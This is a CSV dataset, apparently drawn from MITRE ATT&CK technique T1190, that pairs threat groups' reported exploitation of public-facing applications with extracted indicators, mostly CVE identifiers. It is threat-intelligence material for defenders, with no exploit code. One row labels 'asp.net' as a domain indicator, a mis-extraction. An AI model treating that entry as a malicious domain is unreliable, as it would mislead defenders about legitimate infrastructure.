tech_id,tech_name,text,section,ioc,ioc_value
T1190,Exploit Public-Facing Application,"APT41  exploited CVE-2020-10189 against Zoho ManageEngine Desktop Central, and CVE-2019-19781 to compromise Citrix Application Delivery Controllers (ADC) and gateway devices.   [14]",Procedure Examples,cve,CVE-2020-10189
T1190,Exploit Public-Facing Application,"APT41  exploited CVE-2020-10189 against Zoho ManageEngine Desktop Central, and CVE-2019-19781 to compromise Citrix Application Delivery Controllers (ADC) and gateway devices.   [14]",Procedure Examples,cve,CVE-2019-19781
T1190,Exploit Public-Facing Application,"BackdoorDiplomacy  has exploited CVE-2020-5902, an F5 BIP-IP vulnerability, to drop a Linux backdoor.  BackdoorDiplomacy  has also exploited mis-configured Plesk servers.   [17]",Procedure Examples,cve,CVE-2020-5902
T1190,Exploit Public-Facing Application,"BlackTech  has exploited a buffer overflow vulnerability in Microsoft Internet Information Services (IIS) 6.0, CVE-2017-7269, in order to establish a new HTTP or command and control (C2) server.   [18]",Procedure Examples,cve,CVE-2017-7269
T1190,Exploit Public-Facing Application,"Blue Mockingbird  has gained initial access by exploiting CVE-2019-18935, a vulnerability within Telerik UI for ASP.NET AJAX.   [19]",Procedure Examples,domain,asp.net
T1190,Exploit Public-Facing Application,"Blue Mockingbird  has gained initial access by exploiting CVE-2019-18935, a vulnerability within Telerik UI for ASP.NET AJAX.   [19]",Procedure Examples,cve,CVE-2019-18935
T1190,Exploit Public-Facing Application,"Dragonfly  has conducted SQL injection attacks, exploited vulnerabilities CVE-2019-19781 and CVE-2020-0688 for Citrix and MS Exchange, and CVE-2018-13379 for Fortinet VPNs.   [20]",Procedure Examples,cve,CVE-2020-0688
T1190,Exploit Public-Facing Application,"Dragonfly  has conducted SQL injection attacks, exploited vulnerabilities CVE-2019-19781 and CVE-2020-0688 for Citrix and MS Exchange, and CVE-2018-13379 for Fortinet VPNs.   [20]",Procedure Examples,cve,CVE-2019-19781
T1190,Exploit Public-Facing Application,"Dragonfly  has conducted SQL injection attacks, exploited vulnerabilities CVE-2019-19781 and CVE-2020-0688 for Citrix and MS Exchange, and CVE-2018-13379 for Fortinet VPNs.   [20]",Procedure Examples,cve,CVE-2018-13379
T1190,Exploit Public-Facing Application,"HAFNIUM  has exploited CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE-2021-27065  to compromise on-premises versions of Microsoft Exchange Server, enabling access to email accounts and installation of additional malware.   [30]      [31]      [32]      [33]",Procedure Examples,cve,CVE-2021-26855
T1190,Exploit Public-Facing Application,"HAFNIUM  has exploited CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE-2021-27065  to compromise on-premises versions of Microsoft Exchange Server, enabling access to email accounts and installation of additional malware.   [30]      [31]      [32]      [33]",Procedure Examples,cve,CVE-2021-26858
T1190,Exploit Public-Facing Application,"HAFNIUM  has exploited CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE-2021-27065  to compromise on-premises versions of Microsoft Exchange Server, enabling access to email accounts and installation of additional malware.   [30]      [31]      [32]      [33]",Procedure Examples,cve,CVE-2021-26857
T1190,Exploit Public-Facing Application,"HAFNIUM  has exploited CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE-2021-27065  to compromise on-premises versions of Microsoft Exchange Server, enabling access to email accounts and installation of additional malware.   [30]      [31]      [32]      [33]",Procedure Examples,cve,CVE-2021-27065
T1190,Exploit Public-Facing Application,"Kimsuky  has exploited various vulnerabilities for initial access, including Microsoft Exchange vulnerability CVE-2020-0688.   [36]",Procedure Examples,cve,CVE-2020-0688
T1190,Exploit Public-Facing Application,"Magic Hound  has used open-source JNDI exploit kits to exploit Log4j (CVE-2021-44228) and has exploited ProxyShell (CVE-2021-34473, CVE-2021-34523, CVE-2021-31207) on MS Exchange servers.   [37]      [38]      [39]",Procedure Examples,cve,CVE-2021-44228
T1190,Exploit Public-Facing Application,"Magic Hound  has used open-source JNDI exploit kits to exploit Log4j (CVE-2021-44228) and has exploited ProxyShell (CVE-2021-34473, CVE-2021-34523, CVE-2021-31207) on MS Exchange servers.   [37]      [38]      [39]",Procedure Examples,cve,CVE-2021-31207
T1190,Exploit Public-Facing Application,"Magic Hound  has used open-source JNDI exploit kits to exploit Log4j (CVE-2021-44228) and has exploited ProxyShell (CVE-2021-34473, CVE-2021-34523, CVE-2021-31207) on MS Exchange servers.   [37]      [38]      [39]",Procedure Examples,cve,CVE-2021-34473
T1190,Exploit Public-Facing Application,"Magic Hound  has used open-source JNDI exploit kits to exploit Log4j (CVE-2021-44228) and has exploited ProxyShell (CVE-2021-34473, CVE-2021-34523, CVE-2021-31207) on MS Exchange servers.   [37]      [38]      [39]",Procedure Examples,cve,CVE-2021-34523
T1190,Exploit Public-Facing Application,MuddyWater  has exploited the Microsoft Exchange memory corruption vulnerability (CVE-2020-0688).   [42],Procedure Examples,cve,CVE-2020-0688
T1190,Exploit Public-Facing Application,"Rocke  exploited Apache Struts, Oracle WebLogic (CVE-2017-10271), and Adobe ColdFusion (CVE-2017-3066) vulnerabilities to deliver malware.   [46]      [47]",Procedure Examples,cve,CVE-2017-3066
T1190,Exploit Public-Facing Application,"Rocke  exploited Apache Struts, Oracle WebLogic (CVE-2017-10271), and Adobe ColdFusion (CVE-2017-3066) vulnerabilities to deliver malware.   [46]      [47]",Procedure Examples,cve,CVE-2017-10271
T1190,Exploit Public-Facing Application,"Threat Group-3390  has exploited the Microsoft SharePoint vulnerability CVE-2019-0604 and CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE-2021-27065 in Exchange Server.   [51]",Procedure Examples,cve,CVE-2021-26857
T1190,Exploit Public-Facing Application,"Threat Group-3390  has exploited the Microsoft SharePoint vulnerability CVE-2019-0604 and CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE-2021-27065 in Exchange Server.   [51]",Procedure Examples,cve,CVE-2021-27065
T1190,Exploit Public-Facing Application,"Threat Group-3390  has exploited the Microsoft SharePoint vulnerability CVE-2019-0604 and CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE-2021-27065 in Exchange Server.   [51]",Procedure Examples,cve,CVE-2021-26855
T1190,Exploit Public-Facing Application,"Threat Group-3390  has exploited the Microsoft SharePoint vulnerability CVE-2019-0604 and CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE-2021-27065 in Exchange Server.   [51]",Procedure Examples,cve,CVE-2021-26858
T1190,Exploit Public-Facing Application,"Threat Group-3390  has exploited the Microsoft SharePoint vulnerability CVE-2019-0604 and CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE-2021-27065 in Exchange Server.   [51]",Procedure Examples,cve,CVE-2019-0604
T1190,Exploit Public-Facing Application,"ZxShell  has been dropped through exploitation of CVE-2011-2462, CVE-2013-3163, and CVE-2014-0322.   [54]",Procedure Examples,cve,CVE-2013-3163
